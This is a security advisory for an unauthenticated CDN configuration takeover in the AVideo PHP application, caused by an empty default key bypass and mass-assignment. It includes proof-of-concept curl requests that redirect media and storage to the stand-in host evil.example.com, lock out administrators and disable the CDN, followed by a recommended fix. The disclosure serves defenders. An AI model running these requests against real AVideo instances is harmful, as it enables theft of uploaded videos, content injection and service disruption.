# [H] AVideo: Unauthenticated CDN Configuration Takeover via Empty Default Key Bypass and Mass-Assignment

## Summary
Severity: High
Advisory: GHSA-r64r-883r-wcwh
CVE: CVE-2026-33719
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-r64r-883r-wcwh
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The CDN plugin endpoints `plugin/CDN/status.json.php` and `plugin/CDN/disable.json.php` use key-based authentication with an empty string default key. When the CDN plugin is enabled but the key has not been configured (the default state), the key validation check is completely bypassed, allowing any unauthenticated attacker to modify the full CDN configuration — including CDN URLs, storage credentials, and the authentication key itself — via mass-assignment through the `par` request parameter.

## Details

The CDN plugin defines a default empty key in `plugin/CDN/CDN.php:68`:

```php
$obj->key = "";
```

The `status.json.php` endpoint authenticates requests using this key, but the check has a critical logic flaw at lines 16-27:

```php
// Line 16-19: Requires attacker to provide SOME key value
if (empty($_REQUEST['key'])) {
    $resp->msg = 'Key is empty';
    die(json_encode($resp));
}

// Line 21-26: Only validates key IF stored key is non-empty
if (!empty($obj->key)) {      // When key is "" (default), this is FALSE
    //check the key
    if ($obj->key !== $_REQUEST['key']) {
        $resp->msg = 'Key Does not match';
        die(json_encode($resp));
    }
}
```

When the stored key is the default empty string `""`, `!empty("")` evaluates to `false`, and the entire key comparison block is skipped. Any non-empty value provided by the attacker passes authentication.

Following the bypass, lines 28-31 perform unchecked mass-assignment:

```php
$obj->key = $_REQUEST['key'];
foreach ($_REQUEST['par'] as $key => $value) {
    $obj->{$key} = $value;
    $resp->{$key} = $value;
}
```

The attacker-controlled `par` array sets arbitrary properties on the plugin data object. At line 95, the modified object is persisted to the database:

```php
$cdn = AVideoPlugin::loadPluginIfEnabled('CDN');
$id = $cdn->setDataObject($obj);
```

`setDataObject()` in `Plugin.abstract.php:263` serializes the entire object to JSON and saves it, making all mass-assigned properties persistent.

Exploitable properties (defined in `CDN.php:62-87`) include:
- `CDN` — main CDN URL for serving all video content
- `CDN_S3`, `CDN_B2`, `CDN_FTP` — storage-specific CDN URLs
- `enable_storage` — enables CDN storage functionality
- `storage_hostname`, `storage_username`, `storage_password` — storage backend credentials
- `key` — the authentication key itself (via mass-assignment, can override line 28)

The `disable.json.php` endpoint has the identical authentication bypass (lines 16-27) and additionally deactivates the CDN plugin entirely (line 37: `$cdn->setStatus('inactive')`).

This contrasts with other sensitive endpoints in the codebase that properly use session-based authentication. For example, `Gallery/saveSort.json.php` (commit 087dab884) uses `isGlobalTokenValid()`, and commit daca4ffb1 added `User::isAdmin()` checks to other configuration endpoints.

## PoC

**Prerequisites:** AVideo instance with CDN plugin enabled and key not configured (default state after enabling the plugin).

**Step 1: Verify CDN plugin is enabled and key is default**

```bash
curl -s 'https://target/plugin/CDN/status.json.php' \
  -d 'key=anything' \
  -d 'par[CDN]=https://evil.example.com/'
```

If the response contains `"error":false`, the key bypass worked and CDN URL has been overwritten.

**Step 2: Full takeover — redirect media, enable storage with attacker credentials, lock out admins**

```bash
curl -s 'https://target/plugin/CDN/status.json.php' \
  -d 'key=initial-bypass' \
  -d 'par[CDN]=https://evil.example.com/' \
  -d 'par[enable_storage]=1' \
  -d 'par[storage_hostname]=evil.example.com' \
  -d 'par[storage_username]=attacker' \
  -d 'par[storage_password]=controlled' \
  -d 'par[key]=attacker-secret-key'
```

This single request:
1. Redirects all CDN-served media URLs to attacker's server
2. Enables CDN storage pointing to attacker-controlled host
3. Sets the key to `attacker-secret-key`, locking legitimate administrators out of reconfiguring via this endpoint

**Step 3: Disable CDN entirely (denial of service)**

```bash
curl -s 'https://target/plugin/CDN/disable.json.php' \
  -d 'key=attacker-secret-key' \
  -d 'par[x]=1'
```

This deactivates the CDN plugin, disrupting media delivery.

## Impact

An unauthenticated remote attacker can:

1. **Redirect all media delivery** — By overwriting the CDN URL, all video content served to users is fetched from an attacker-controlled server, enabling content injection or phishing.
2. **Exfiltrate uploaded videos** — By enabling storage with attacker-controlled credentials, newly uploaded videos are sent to the attacker's storage server.
3. **Overwrite storage credentials** — The `storage_hostname`, `storage_username`, and `storage_password` fields are all mass-assignable, allowing the attacker to hijack the storage backend.
4. **Lock out administrators** — By setting the `key` via mass-assignment, the attacker prevents legitimate administrators from using these endpoints to restore configuration (though admin panel access is unaffected).
5. **Disable CDN** — Via `disable.json.php`, the attacker can deactivate the CDN plugin entirely, causing service disruption for media delivery.

The vulnerability is exploitable on any AVideo instance where the CDN plugin has been enabled but the key has not been manually configured — which is the default state immediately after enabling the plugin.

## Recommended Fix

Add proper session-based authentication to both endpoints and remove the flawed key-only auth as the sole gate. In `plugin/CDN/status.json.php` and `plugin/CDN/disable.json.php`, add an admin check after the configuration include:

```php
require_once dirname(__FILE__) . '/../../videos/configuration.php';
_session_write_close();
header('Content-Type: application/json');

$resp = new stdClass();
$resp->error = true;
$resp->msg = '';

// Fix: Require admin authentication
if (!User::isAdmin()) {
    $obj = AVideoPlugin::getDataObjectIfEnabled('CDN');
    if (empty($obj) || empty($obj->key) || empty($_REQUEST['key']) || $obj->key !== $_REQUEST['key']) {
        $resp->msg = 'Authentication required';
        die(json_encode($resp));
    }
}
```

Additionally, restrict mass-assignment to only known, safe properties by validating against a whitelist:

```php
$allowedParams = ['CDN', 'CDN_S3', 'CDN_B2', 'CDN_FTP', 'CDN_Live'];
foreach ($_REQUEST['par'] as $key => $value) {
    if (!in_array($key, $allowedParams, true)) {
        continue;
    }
    $obj->{$key} = $value;
    $resp->{$key} = $value;
}
```

This prevents mass-assignment of sensitive properties like `key`, `storage_password`, `storage_hostname`, and `enable_storage` even when the key-based auth is legitimately used by CDN nodes.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-r64r-883r-wcwh
- https://nvd.nist.gov/vuln/detail/CVE-2026-33719
- https://github.com/WWBN/AVideo/commit/adeff0a31ba04a56f411eef256139fd7ed7d4310
- https://github.com/WWBN/AVideo
